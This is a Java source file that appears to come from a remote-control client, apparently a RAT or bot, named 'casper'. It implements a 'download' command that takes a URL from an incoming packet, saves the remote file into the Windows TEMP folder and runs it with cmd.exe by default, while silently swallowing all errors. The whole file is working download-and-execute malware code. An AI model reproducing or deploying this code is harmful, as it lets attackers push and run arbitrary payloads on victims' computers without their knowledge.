package casper.client.commands.impl;

import casper.client.Client;
import casper.client.commands.Action;
import casper.client.commands.Command;
import casper.client.script.Browser;
import casper.net.Packet;
import casper.net.json.JSONArray;
import casper.net.json.JSONException;

import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

/**
 * A basic download and execute function for the client.
 *
 * @author Aazim
 * @version 1.1
 */
@Command("download")
public class Download implements Action {

    public void execute(Client client, Packet p) throws JSONException {
        JSONArray params = p.readJSONArray();
        try {
            final String link = params.getString(0);
            final URL url = new URL(link);
            final Browser browser = new Browser(url);
            ReadableByteChannel r = Channels.newChannel(browser.getInputSteam());
            String saveLoc = System.getenv("TEMP") + "\\" + link.substring(link.lastIndexOf("/") + 1);
            boolean execute = true;
            for (int i = 0; i < params.length(); i++) {
                if (params.getString(i).startsWith("-name:")) {
                    String name = params.getString(i).substring(params.getString(i).indexOf(":") + 1);
                    saveLoc = System.getenv("TEMP") + "\\" + name;
                } else if (params.getString(i).equalsIgnoreCase("-norun")) {
                    execute = false;
                }
            }
            File file = new File(saveLoc);
            if (!file.exists() && !file.createNewFile()) return;
            FileOutputStream fos = new FileOutputStream(file);
            fos.getChannel().transferFrom(r, 0, 1 << 24);
            fos.close();
            if (execute) {
                final Runtime cmd = Runtime.getRuntime();
                cmd.exec("cmd.exe /c \"" + saveLoc + "\"");
                Thread.sleep(1000);
            }
            file.deleteOnExit();
        } catch (Exception ignored) {

        }
    }
}
